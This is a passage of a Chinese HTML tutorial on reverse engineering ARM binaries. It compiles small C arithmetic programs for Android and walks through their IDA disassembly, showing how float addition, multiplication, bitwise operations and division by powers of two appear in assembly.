class="built_in">R0</span>, <span class="number">#0x109</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000414</span>                 <span class="keyword">STRH</span>            <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_34]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000418</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x7B</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000041</span>C                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_38]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000420</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x1C8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000424</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_3C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000428</span>                 <span class="keyword">STR</span>             <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_44]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000042</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0x315</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000434</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_48]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000438</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xFEF7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000440</span>                 <span class="keyword">STRH</span>            <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_4A]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000444</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xFFFFFF85</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000448</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_50]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000044</span>C                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, <span class="number">=0xFFFFFE38</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000450</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_54]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000454</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xFFFFFFFF</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000458</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_5C] <span class="comment">; 高32位为 -1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000045</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xFFFFFCEB</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000460</span>                 <span class="keyword">STR</span>             <span class="built_in">R0</span>, [<span class="built_in">SP</span>,<span class="number">#0x60</span>+var_60] <span class="comment">; 低32位位-789;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000464</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000468</span>                 <span class="keyword">ADD</span>             <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x60</span> <span class="comment">; &#x27;`&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000046</span>C                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<p>可以看出基本数据类型直接使用对应大小的内存保存。</p>
<h1 id="加、减、乘和位运算"><a href="#加、减、乘和位运算" class="headerlink" title="加、减、乘和位运算"></a>加、减、乘和位运算</h1><p>整型的加法和减法比较简单，我们主要看一下浮点数的加法。</p>
<h2 id="浮点数加法"><a href="#浮点数加法" class="headerlink" title="浮点数加法"></a>浮点数加法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> f1 = argc +  <span class="number">0.625</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%f\r\n&quot;</span>, f1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的 makefile 文件。</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">add_sub:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 add_sub.c -o add_sub</span><br><span class="line">	adb push add_sub /data/local/tmp/add_sub</span><br><span class="line">	adb shell chmod +x /data/local/tmp/add_sub</span><br><span class="line">	adb shell /data/local/tmp/add_sub</span><br></pre></td></tr></table></figure>
<p>使用 IDA 查看对应的汇编代码：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">MOV</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">BL</span>              __floatsisf <span class="comment">; Convert int to float.</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="number">#0x3F200000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">BL</span>              __aeabi_fadd <span class="comment">; Add, float.</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">BL</span>              __extendsfdf2 <span class="comment">; Extend float to double.</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">MOV</span>             <span class="built_in">R2</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aF - <span class="number">0x404</span>) <span class="comment">; &quot;%f\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">MOV</span>             <span class="built_in">R3</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>, <span class="built_in">R0</span> <span class="comment">; &quot;%f\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">POP</span>             &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<p>在汇编代码中，我们可以看到调用了 <code>__floatsisf</code> 、 <code>__aeabi_fadd</code> 、 <code>__extendsfdf2</code> 函数，通过名字可以猜测与浮点数运算相关。通过搜索后发现了相关文档：<a href="https://www.segger.com/doc/UM12008_FloatingPointLibrary.html">https://www.segger.com/doc/UM12008_FloatingPointLibrary.html</a> ，通过该文档可以查看各种浮点运算相关的库函数。</p>
<p>而实际逆向过程中，各种函数的名称都经过处理了，不会有这么多符号，我们使用 strip 工具进行处理一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-strip --strip-unneeded add_sub</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">MOV</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">BL</span>              sub_970</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="number">#0x3F200000</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">BL</span>              sub_7D8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">BL</span>              sub_718</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">MOV</span>             <span class="built_in">R2</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(aF - <span class="number">0x404</span>) <span class="comment">; &quot;%f\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">MOV</span>             <span class="built_in">R3</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>, <span class="built_in">R0</span> <span class="comment">; &quot;%f\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">POP</span>             &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<p>可以发现浮点数相关的函数名没有了，这时就需要进一步跟进函数进行或者制作 sig 文件确认函数的功能。</p>
<h2 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = argc * <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    n = n * <span class="number">7</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makefile 文件内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">mul:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 mul.c -o mul</span><br><span class="line">	adb push mul /data/local/tmp/mul</span><br><span class="line">	adb shell chmod +x /data/local/tmp/mul</span><br><span class="line">	adb shell /data/local/tmp/mul</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">ADD</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">LDR</span>             <span class="built_in">R5</span>, =(aD - <span class="number">0x3F0</span>) <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">MOV</span>             <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E4                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R0</span>,LSL<span class="number">#3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">ADD</span>             <span class="built_in">R5</span>, <span class="built_in">PC</span>, <span class="built_in">R5</span> <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">RSB</span>             <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="built_in">R4</span>,LSL<span class="number">#3</span> <span class="comment">; R0=R4&lt;&lt;3-R4=R4*7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R0</span>,LSL<span class="number">#3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R5</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">POP</span>             &#123;<span class="built_in">R4</span>,<span class="built_in">R5</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<p>可以看到乘法运算编译后变成了位运算，这是因为位运算使用的指令周期比较短，速度更快。</p>
<h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = argc &amp; <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    </span><br><span class="line">    n = n | (<span class="type">int</span>)argv;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    n = n ^ <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    n = ~n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    n = n&lt;&lt;<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line"></span><br><span class="line">    n = n&gt;&gt;argc;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>makefile 文件内容如下：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">bit:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 bit.c -o bit</span><br><span class="line">	adb push bit /data/local/tmp/bit</span><br><span class="line">	adb shell chmod +x /data/local/tmp/bit</span><br><span class="line">	adb shell /data/local/tmp/bit</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R4</span>-<span class="built_in">R7</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">ADD</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#0x10</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">LDR</span>             <span class="built_in">R7</span>, =(aD - <span class="number">0x3F8</span>) <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">AND</span>             <span class="built_in">R6</span>, <span class="built_in">R0</span>, <span class="number">#2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E4                 <span class="keyword">MOV</span>             <span class="built_in">R5</span>, <span class="built_in">R1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">MOV</span>             <span class="built_in">R4</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R6</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">ADD</span>             <span class="built_in">R7</span>, <span class="built_in">PC</span>, <span class="built_in">R7</span> <span class="comment">; &quot;%d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">ORR</span>             <span class="built_in">R5</span>, <span class="built_in">R6</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000040</span>C                 <span class="keyword">EOR</span>             <span class="built_in">R1</span>, <span class="built_in">R5</span>, <span class="number">#3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000410</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000414</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000418</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0xFFFFFFFC</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000041</span>C                 <span class="keyword">EOR</span>             <span class="built_in">R5</span>, <span class="built_in">R5</span>, <span class="built_in">R0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000420</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000424</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000428</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000042</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R5</span>, <span class="built_in">R5</span>,LSL<span class="number">#3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000430</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000434</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000438</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000043</span>C                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R5</span>,<span class="keyword">ASR</span> <span class="built_in">R4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000440</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="built_in">R7</span>  <span class="comment">; format</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000444</span>                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000448</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000044</span>C                 <span class="keyword">POP</span>             &#123;<span class="built_in">R4</span>-<span class="built_in">R7</span>,<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000450</span>                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<p>可以看到位运算基本都有对应的汇编指令。</p>
<h1 id="除法和模运算"><a href="#除法和模运算" class="headerlink" title="除法和模运算"></a>除法和模运算</h1><p>除法运算会转换位乘法和位运算，在转换过程中比较复杂，有多种转换公式，下面将分多种情况进行讲解。</p>
<h2 id="x-除以-2-n"><a href="#x-除以-2-n" class="headerlink" title="x 除以 2^n"></a>x 除以 2^n</h2><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(n &gt;= 0)&#123;</span><br><span class="line">    x &gt;&gt; n;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    (x + 2^n -1) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = argc / <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> j = argc % <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d, %d\r\n&quot;</span>, i, j);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D4</span>                 <span class="keyword">PUSH</span>            &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">D8</span>                 <span class="keyword">MOV</span>             <span class="built_in">R11</span>, <span class="built_in">SP</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>DC                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R0</span>,ASR<span class="number">#31</span> <span class="comment">;  获取符号位，R1=0或者R1=-1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E0                 <span class="keyword">ADD</span>             <span class="built_in">R2</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span>,LSR<span class="number">#29</span> <span class="comment">; 如果R1=0,则R2=R0,否则R2=R0+7</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E4                 <span class="keyword">BIC</span>             <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="number">#7</span> <span class="comment">; 按位清除</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>E8                 <span class="keyword">SUB</span>             <span class="built_in">R2</span>, <span class="built_in">R0</span>, <span class="built_in">R2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>EC                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span>,LSR<span class="number">#30</span> <span class="comment">; 如果R1=0,则R2=R0,否则R2=R0+3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F0</span>                 <span class="keyword">MOV</span>             <span class="built_in">R1</span>, <span class="built_in">R0</span>,ASR<span class="number">#2</span> <span class="comment">; R1=R0&gt;&gt;2,即n=2,除数位2^2=4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span><span class="built_in">F4</span>                 <span class="keyword">LDR</span>             <span class="built_in">R0</span>, =(<span class="keyword">aDD</span> - <span class="number">0x400</span>) <span class="comment">; &quot;%d, %d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>F8                 <span class="keyword">ADD</span>             <span class="built_in">R0</span>, <span class="built_in">PC</span>, <span class="built_in">R0</span> <span class="comment">; &quot;%d, %d\r\n&quot;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">000003</span>FC                 <span class="keyword">BL</span>              printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000400</span>                 <span class="keyword">MOV</span>             <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000404</span>                 <span class="keyword">POP</span>             &#123;<span class="built_in">R11</span>,<span class="built_in">LR</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00000408</span>                 <span class="keyword">BX</span>              <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>


<h2 id="x-除以负-2-n"><a href="#x-除以负-2-n" class="headerlink" title="x 除以负 2^n"></a>x 除以负 2^n</h2><p>算法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(x &gt;= 0)</span><br><span class="line">    -(x &gt;&gt; n);</span><br><span class="line">else</span><br><span class="line">    -((x + 2^n -1) &gt;&gt; n);</span><br></pre></td></tr></table></figure>
<p>例如:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n = argc /<span class="number">-4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    n = argc % <span class="number">-8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>makefile文件：</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">div02:</span></span><br><span class="line">	clang -target arm-linux-android21 -O2 div02.c -o div02</span><br><span class="line">	adb push div02 /data/local/tmp/div02</span><br><span class="line">	adb shell chmod +x /data/local/tmp/div02</span><br><span class="line">	adb shell /data/local/tmp/div02</span><br></pre></td></tr></table></figure>

<p>IDA 反汇编结果如下：</p>
